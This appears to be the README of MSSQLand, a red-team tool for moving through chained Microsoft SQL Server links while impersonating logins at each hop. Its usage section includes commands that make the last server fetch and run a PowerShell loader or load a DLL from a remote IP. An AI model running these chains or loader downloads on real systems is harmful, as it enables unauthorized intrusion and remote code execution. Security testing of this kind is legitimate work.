MSSQLand is your ultimate tool for interacting with [Microsoft SQL Server (MSSQL)](https://en.wikipedia.org/wiki/Microsoft_SQL_Server) database management system (DBMS) in your red activities. Primarily designed for constrained environments where operations must be conducted directly through your beacon. It allows you to pave your way across multiple linked servers and impersonate anyone (authorised) on the road, popping out of the last hop with any desired action.

## Show Time üëë
You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth. Let's say you‚Äôve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you!

After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? 

This is what it looks like to verify if you are `sysadmin` in `SQL03` when you have to impersonate `webapp03` on `SQL02` and `webapp04` on `SQL03`:

- [OPENQUERY](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_data_access_enabled`):

```sql
SELECT * FROM OPENQUERY([SQL02], 'EXECUTE AS LOGIN = ''webapp03''; SELECT * FROM OPENQUERY([SQL03], ''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') REVERT;')
```

- [RPC Out](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_rpc_out_enabled`):

```shell
EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') AT [SQL03]; REVERT;') AT [SQL02]
```

No thanks üö´. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:

```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
```

The output is as follows:
```txt

|-> Mapped to the user dbo
[i] Execution chain: SQL02 -> SQL03 -> SQL04
[i] Logged in on SQL04 as webapps
|-> Mapped to the user guest

[>] Executing action 'Links' against SQL04
|-> Retrieving Linked SQL Servers

| Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |
| -------------------- | ----- | ---------- | -------- | ----------- | ----------- | ------------ | ------- | --------- | --------- |

```

Now you want to verify who you can impersonate at the end of the chain:
```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
```
The output shows:

```txt
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Server: localhost,1433
|-> Database: master
|-> Server Version: 15.00.2000

[i] Logged in on SQL01 as NT AUTHORITY\SYSTEM

[i] You can impersonate anyone as a sysadmin
[+] Successfully impersonated user: webapp02
[i] Server chain: SQL02 -> SQL03 -> SQL04
[i] Logged in as webapps

[>] Executing action 'Impersonation' against SQL04
|-> Starting impersonation check for all logins
|-> Checking impersonation permissions individually

| Logins      | Impersonation |
| ----------- | ------------- |
| sa          | No            |
| MarieJo     | Yes           |
| Imane       | Yes           |
| John        | No            |
```

Great! Now you can directly reach out to your loader with:
```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
```

Or even use Common Language Runtime (CLR) to load remotely a library with:
```txt
/a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"
```

## Project Structure üìö
This project follows several key software development principles and practices.

1. **Single Responsability Principle (SRP)**

Each class should have one, and only one, reason to change. Each action class in the [`Actions`](./MSSQLand/Actions) directory, like [`Tables`](./MSSQLand/Actions/Database/Tables.cs) or [`Permissions`](./MSSQLand/Actions/Database/Permissions.cs), is responsible for a single operation.
The [`Logger`](./MSSQLand/Utilities/Logger.cs) class solely handles logging, decoupling it from other logic.

3. **Open/Close Principle (OCP)**

Software entities should be open for extension but closed for modification. Here, the [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) abstract class defines a common interface-like for all actions. New actions can be added by inheriting from it without modifying existing code. Then, the [`ActionFactory`](./MSSQLand/Actions/ActionFactory.cs) enables seamless addition of new actions by simply adding them to the switch case.

4. **Liskov Substitution Principle (LSP)**

Subtypes should be substitutable for their base types without altering program behavior. Here, the [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) class ensures all derived actions (e.g., Tables, Permissions, Smb) can be used interchangeably, provided they implement `ValidateArguments` and `Execute`.

5. **DRY (Don't Repeat Yourself)**

Avoid duplicating logic across the codebase. The [`QueryService`](./MSSQLand/Services/QueryService.cs) centralizes query execution, avoiding repetition in individual actions.

6. **KISS (Keep It Simple, Stupid)**

Systems should be as simple as possible but no simpler. Complex linked server queries and impersonation are abstracted into services, simplifying their usage.

8. **Extensibility**

The system should be easy to extend with new features. New actions can be added without altering core functionality by extending [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) and adding the created-one to the [factory](./MSSQLand/Actions/ActionFactory.cs).

#### Directories

- [`Models`](./MSSQLand/Models)

Contains classes representing SQL Server entities, such as Server and LinkedServers.

- [`Services`](./MSSQLand/Services)

The backbone of the application, responsible for connection management, query execution, user management, and configuration handling.

- [`Actions`](./MSSQLand/Actions)

This directory contains all the specific operations that MSSQLand can perform. Each action follows a modular design using the command pattern to encapsulate its logic, such as PowerShell execution, querying, impersonation, and more.

- [`Utilities`](./MSSQLand/Utilities)

Helper classes like Logger and MarkdownFormatter that make your life easier.

## Contributing ü´Ç
Contributions to MSSQLand are welcome and appreciated! Whether it's fixing bugs, adding new features, improving the documentation, or sharing feedback, your effort is valued and makes a difference.
Open-source thrives on collaboration and recognition. Contributions, large or small, help improve the tool and its community. Your time and effort are truly valued. 

Here, no one will be erased from Git history. No fear to have here‚Äîno one will copy-paste your code without adhering to the collaborative ethos of open-source.

Please see the [CONTRIBUTING.md](./CONTRIBUTING.md) for detailed guidelines on how to get started.

## Origin ü•ö
MSSQLand was initially inspired by [SQLRecon](https://github.com/skahwah/SQLRecon), which provided a solid foundation for MS SQL post-exploitation and reconnaissance. However, during my contributions to SQLRecon ‚Äî particularly in addressing [chained linked server traversal](https://github.com/skahwah/SQLRecon/issues/16#issuecomment-2048435229) and enhancing user impersonation ‚Äî I encountered significant roadblocks in how contributions were handled. [My pull request](https://github.com/skahwah/SQLRecon/pull/17), which introduced major improvements in impersonation, chaining, and context management, was ultimately not merged but copy pasted.

Rather than let this work go to waste, I decided to develop MSSQLand, an OOP-driven, modular, and community-friendly alternative. Unlike SQLRecon, which required deep refactoring to make simple modifications, MSSQLand was built with developers in mind. The tool is built with extensibility in mind, allowing integration of new features while maintaining clarity and simplicity. It aims to provide a structured, customizable, and operator-friendly experience for engagements requiring MS SQL exploitation.

While I appreciate the inspiration SQLRecon provided, MSSQLand is designed to be open to contributions, transparent in development, and aligned with the collaborative spirit of open-source software.
